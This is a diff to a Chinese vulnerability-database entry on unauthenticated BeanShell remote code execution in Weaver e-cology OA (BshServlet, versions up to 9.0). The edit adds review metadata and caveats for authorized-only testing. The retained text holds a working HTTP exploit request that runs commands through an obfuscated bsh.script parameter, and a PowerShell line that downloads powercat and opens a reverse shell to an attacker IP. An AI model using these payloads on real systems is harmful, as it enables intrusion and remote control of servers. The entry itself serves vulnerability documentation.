@@ -1,8 +1,48 @@
 ---
 source: "hatch 补库批 20260928"
+title: "泛微e-cology BshServlet未授权BeanShell 远程代码执行"
+product: "泛微e-cology"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "<=9.0声称；2019-09-17补丁，平台/路径变体"
+prerequisites: "声称未认证"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_status: "unknown"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20%3C%3D9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
+id: "vw-cacdee1b833cf6bc5d8a6b74"
+entity_id: "ve-cacdee1b833cf6bc5d8a6b74"
+schema_version: "1"
 ---
 
-# 泛微OA E-cology \<=9.0 远程代码执行漏洞
+# 泛微e-cology BshServlet未授权BeanShell 远程代码执行
+
+## 条目说明
+
+- 对象与具体问题：泛微e-cology；BshServlet未授权BeanShell RCE
+- 版本、配置及部署条件：<=9.0声称；2019-09-17补丁，平台/路径变体
+- 认证与权限前提：声称未认证
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 与Bsh短篇同请求，新增路径变体和Python2批量脚本，可做附录而非另建漏洞
+- 脚本以200且无三种字符串判成功，可能误报；print/except为Python2，启动说明未标版本且缺sys.argv参数
+- 代码重复Content-Type键和固定Content-Length；转码{=html}块噪声
+- 文中多数Windows/利用工具提及不构成产品版本证明
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
 
 一、漏洞简介
 ------------
@@ -20,7 +60,7 @@ e-cology \<=9.0
 三、复现过程
 ------------
 
-### 漏洞指纹
+#### 漏洞指纹
 
     Set-Cookie: ecology_JSessionId=
 
@@ -28,8 +68,9 @@ ecology
 
     /weaver/bsh.servlet.BshServlet
 
-### 漏洞复现
+#### 漏洞复现
 
+```http
     POST /weaver/bsh.servlet.BshServlet HTTP/1.1
     Host: www.0-sec.org:8088
     Accept: */*
@@ -40,6 +81,7 @@ ecology
     Content-Type: application/x-www-form-urlencoded
 
     bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+```
 
 ***利用技巧***
 
@@ -57,7 +99,7 @@ ecology
 ```
     powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
 
-### poc
+#### poc
 
 useage
 
